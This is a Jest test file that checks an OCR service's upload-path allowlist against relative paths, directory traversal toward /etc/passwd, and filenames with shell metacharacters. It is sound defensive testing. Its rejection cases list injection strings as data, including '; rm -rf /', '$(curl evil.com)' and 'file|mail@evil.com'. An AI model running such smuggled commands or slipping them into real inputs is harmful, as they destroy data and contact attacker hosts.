import { isPathAllowed, validateImage } from '../services/ocr';
import * as path from 'path';
import * as fs from 'fs/promises';
import * as os from 'os';

const UPLOAD_DIR = path.join(process.cwd(), 'uploads');

describe('isPathAllowed', () => {
  it('accepts valid absolute paths under UPLOAD_DIR', () => {
    expect(isPathAllowed(path.join(UPLOAD_DIR, 'test.png'))).toBe(true);
  });

  it('rejects relative paths', () => {
    expect(isPathAllowed('uploads/test.png')).toBe(false);
    expect(isPathAllowed('./uploads/test.png')).toBe(false);
    expect(isPathAllowed('../etc/passwd')).toBe(false);
  });

  it('rejects paths outside UPLOAD_DIR', () => {
    expect(isPathAllowed('/etc/passwd')).toBe(false);
    expect(isPathAllowed('C:\\Windows\\System32')).toBe(false);
  });

  it('rejects path traversal attempts', () => {
    expect(isPathAllowed(path.join(UPLOAD_DIR, '..', '..', 'etc', 'passwd'))).toBe(false);
    expect(isPathAllowed(path.join(UPLOAD_DIR, '..', 'secret'))).toBe(false);
  });

  it('rejects filenames with shell metacharacters', () => {
    const dangerous = [
      '; rm -rf /',
      '"; rm -rf /',
      '`whoami`',
      '$(curl evil.com)',
      'file|mail@evil.com',
      'file&whoami',
      'file$var',
      'file<test',
      'file>test',
    ];
    dangerous.forEach((name) => {
      expect(isPathAllowed(path.join(UPLOAD_DIR, name))).toBe(false);
    });
  });

  it('accepts normal filenames under UPLOAD_DIR', () => {
    const valid = [
      'photo-2024-01-01.png',
      'my document (1).jpg',
      '图片_test.jpeg',
      'file-with-dashes_and_underscores.bmp',
      'UPLOAD.IMG',
    ];
    valid.forEach((name) => {
      expect(isPathAllowed(path.join(UPLOAD_DIR, name))).toBe(true);
    });
  });
});

describe('validateImage — path allowlist', () => {
  it('returns valid:false for disallowed paths', async () => {
    const result = await validateImage('/etc/passwd');
    expect(result.valid).toBe(false);
    expect(result.error).toBe('Path not allowed');
  });

  it('returns valid:false for path traversal attempts', async () => {
    const result = await validateImage(path.join(UPLOAD_DIR, '..', '..', 'etc', 'passwd'));
    expect(result.valid).toBe(false);
    expect(result.error).toBe('Path not allowed');
  });

  it('returns valid:false for filenames with shell metacharacters', async () => {
    const result = await validateImage(path.join(UPLOAD_DIR, '; curl evil.com'));
    expect(result.valid).toBe(false);
    expect(result.error).toBe('Path not allowed');
  });

  it('returns valid:false for non-existent files under UPLOAD_DIR', async () => {
    const fakePath = path.join(UPLOAD_DIR, 'does-not-exist-12345.png');
    const result = await validateImage(fakePath);
    expect(result.valid).toBe(false);
  });

  it('accepts a real image file under UPLOAD_DIR', async () => {
    const tempFile = path.join(UPLOAD_DIR, `test-validate-${Date.now()}.png`);
    await fs.mkdir(UPLOAD_DIR, { recursive: true });
    const pngBuffer = Buffer.from(
      '89504e470d0a1a0a0000000d49484452000000010000000108020000009001' +
      '2e00000000c4944415478016360f8cfc00000000200011b221cbd3800000000',
      'hex'
    );
    await fs.writeFile(tempFile, pngBuffer);
    try {
      const result = await validateImage(tempFile);
      expect(result.valid).toBe(true);
    } finally {
      await fs.unlink(tempFile).catch(() => {});
    }
  });
});
